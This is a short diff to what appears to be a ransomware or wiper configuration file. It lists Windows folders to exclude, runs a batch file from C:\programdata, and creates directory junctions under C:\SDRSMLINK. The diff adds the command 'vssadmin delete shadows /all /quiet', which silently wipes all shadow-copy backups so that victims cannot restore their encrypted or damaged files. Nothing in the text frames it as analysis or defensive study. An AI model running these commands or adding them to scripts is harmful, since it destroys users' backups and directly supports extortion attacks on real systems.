@@ -7,6 +7,7 @@ exclude:
   - '%SYSTEMDRIVE%\Windows'
   - '%SYSTEMDRIVE%\ProgramData'
 command:
+  - vssadmin delete shadows /all /quiet
   - cmd.exe /c c:\programdata\3.bat
   - cmd.exe /C mklink /j "C:\SDRSMLINK\Documents and Settings" "C:\Documents and Settings"
   - cmd.exe /C mklink /j "C:\SDRSMLINK\Program files (x86)" "C:\Program files (x86)"
